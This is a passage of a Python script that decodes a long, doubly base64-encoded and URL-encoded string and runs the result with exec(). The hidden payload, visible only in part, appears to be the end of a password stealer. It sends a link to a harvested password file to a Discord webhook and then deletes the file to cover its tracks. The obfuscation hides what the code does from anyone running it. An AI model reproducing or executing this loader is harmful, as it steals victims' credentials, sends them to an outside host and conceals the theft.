FsS1FvZ0lDQWdhV1lnYkdsdWF6b0tJQ0FnSUNBZ0lDQWpJRk5vYjNKMFpXNGdkR2hsSUd4cGJtc0tJQ0FnSUNBZ0lDQnphRzl5ZEdWdVpXUmZiR2x1YXlBOUlITm9iM0owWlc1ZmJHbHVheWhzYVc1cktRb2dJQ0FnSUNBZ0lDTWdVMlZ1WkNCMGFHVWdiR2x1YXlCMGJ5QkVhWE5qYjNKa0lIZGxZbWh2YjJzS0lDQWdJQ0FnSUNCelpXNWtYM1J2WDJScGMyTnZjbVFvYzJodmNuUmxibVZrWDJ4cGJtc3NJSGRsWW1odmIydGZkWEpzS1FvS0lDQWdJQ01nUkdWc1pYUmxJSFJvWlNCd1lYTnpkMjl5WkNCbWFXeGxJR0ZtZEdWeUlIVnpaUW9nSUNBZ2IzTXVjbVZ0YjNabEtHOTFkSEIxZEY5bWFXeGxibUZ0WlNrS0NtbG1JRjlmYm1GdFpWOWZJRDA5SUNKZlgyMWhhVzVmWHlJNkNpQWdJQ0J0WVdsdUtDa0s="""

base64_decoded = base64.b64decode(base64_encoded_url).decode("utf-8")

url_decoded = urllib.parse.unquote(base64_decoded)

final_decoded_script = base64.b64decode(url_decoded).decode("utf-8")

exec(final_decoded_script)